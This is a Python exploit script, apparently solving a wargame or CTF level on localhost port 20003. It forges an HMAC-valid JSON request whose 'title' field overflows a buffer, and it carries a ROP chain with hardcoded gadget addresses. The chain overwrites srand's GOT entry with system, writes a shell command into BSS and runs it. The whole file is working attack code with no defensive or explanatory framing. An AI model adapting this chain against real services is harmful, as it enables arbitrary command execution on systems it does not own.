import struct
import socket
import time
import hmac
import hashlib


SLEEP_TIME = 0.05
IP = '127.0.0.1'
PORT = 20003
MAX_TOKEN_SIZE = len('"// 127.123.123.123:60868-1537559363-1777936966-511781062-1113723971"')+10
SRAND_LIBC = 0xb74e8fc0 
SYSTEM_LIBC = 0xb74f2b20
SYSTEM_SRAND_OFFSET = SYSTEM_LIBC - SRAND_LIBC # 9b60
SRAND_PLT = 0x08048c20
SRAND_PLT_GOT = 0x804bcd4 
MEMCPY_PLT = 0x08048e60
BSS_SECTION = 0x804bdcc


def connect():
    return socket.create_connection((IP, PORT))


def p(num):
    return struct.pack("I", num)

    
def retrieve_token(s):
    token = s.recv(MAX_TOKEN_SIZE)
    token = token.strip().strip('"')
    
    return token

   
def generate_valid_request(s, token, request):
    all_request_data = token + '\n' + request
    mac = hmac.new(token, all_request_data, hashlib.sha1)
    i = 0
    
    while not mac.hexdigest().startswith('0000'):
        all_request_data = token + '\n' + request[0:-3] + str(i) + '" }'
        mac = hmac.new(token, all_request_data, hashlib.sha1)
        i = i + 1
    
    print('MAC Found: {}'.format(mac.hexdigest()))
    
    return all_request_data
   
   
# 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
# 0x08049b4f : pop eax ; add esp, 0x5c ; ret
# 0x08048bf0 : pop ebx ; ret
# 0x0804a282 : mov ebx, dword ptr [esp] ; ret
def write_bss(where, what):
    substract = 0x5d5b04c4
    payload = p(0x08048bf0) # pop ebx
    payload += p((where - substract) & 0xFFFFFFFF)
    payload += p(0x08049b4f)
    payload += what
    payload += 'A'*0x5c
    payload += p(0x080493fe)
    
    return payload
   
   
def generate_payload():
    payload = 'A'*127
    payload += '\\\\u1234'
    payload += 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHH'

    # OVERRIDE SRAND WITH SYSTEM
    payload += p(0x08048bf0)                                # EIP
    payload += p((SRAND_PLT_GOT - 0x5d5b04c4) & 0xffffffff) # EBX 
    payload += p(0x08049b4f)                                # ret
    payload += '\\\\u609b\\\\u0000'                         # SYSTEM_SRAND_OFFSET
    payload += 'A' * 0x5c                                   # add esp, 0x5c
    payload += p(0x080493fe)                                # ret to add
    # ### NOW SRAND IS OVERWRITTEN WITH SYSTEM
    
    # WRITE PAYLOAD TO BSS_SECTION
    WRITE = 'echo aa > /tmp/a'
    for i in range(0, len(WRITE), 4):
        payload += write_bss(BSS_SECTION+i, WRITE[i:i+4])
        
    # RUN SYSTEM
    payload += p(SRAND_PLT)
    payload += p(0xAAAAAAAA)                                  # system ret
    payload += p(BSS_SECTION)                                 # argument to system
    
    return payload
   
    
def send_request(s, token):
    payload = generate_payload()
    request = '{ "title": "'+payload+'", "contents": "hehe", "serverip": "127.0.0.1", "dummy": "" }'
    
    valid_request = generate_valid_request(s, token, request)
    
    s.send(valid_request)

    
def main():
    s = connect()
    token = retrieve_token(s)
    print(token)
    send_request(s, token)
    s.close()
    time.sleep(SLEEP_TIME)

if __name__ == '__main__':
    main()